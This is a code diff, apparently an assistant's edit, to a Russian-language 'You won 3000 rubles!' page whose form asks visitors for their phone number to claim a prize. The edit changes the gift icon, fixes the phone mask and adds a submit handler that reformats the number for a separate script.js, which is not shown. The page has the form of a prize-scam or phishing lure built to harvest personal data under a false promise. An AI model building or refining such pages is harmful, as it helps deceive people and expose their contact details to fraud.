@@ -10,7 +10,7 @@
   <canvas id="confetti"></canvas>
 
   <div class="container">
-    <img src="https://cdn-icons-png.flaticon.com/512/3082/3082031.png" alt="Подарок" class="gift" />
+    <img src="https://cdn-icons-png.flaticon.com/512/2917/2917242.png" alt="Подарок" class="gift" />
     <h1>🎉 Поздравляем!</h1>
     <p class="subtitle">Вы выиграли <b>3000 рублей</b>!</p>
     <p class="instruction">Введите ваши данные для получения приза:</p>
@@ -25,16 +25,20 @@
   </div>
 
   <script src="https://unpkg.com/imask"></script>
-  <script src="script.js"></script>
   <script>
     const phoneInput = document.getElementById('phone');
-
     const maskOptions = {
-      mask: '+7(000)000-00-00',
-      lazy: false, // чтобы показывало маску сразу
+      mask: '+{7}(000)000-00-00',
+      lazy: false,
     };
-
     const mask = IMask(phoneInput, maskOptions);
+
+    // Обеспечим синхронизацию с твоим script.js
+    document.getElementById("prizeForm").addEventListener("submit", function (e) {
+      const phoneRaw = mask.unmaskedValue; // сохраняем "чистый" номер для script.js
+      document.getElementById("phone").value = '+7' + phoneRaw.slice(1); // нормализуем формат
+    });
   </script>
+  <script src="script.js"></script>
 </body>
 </html>
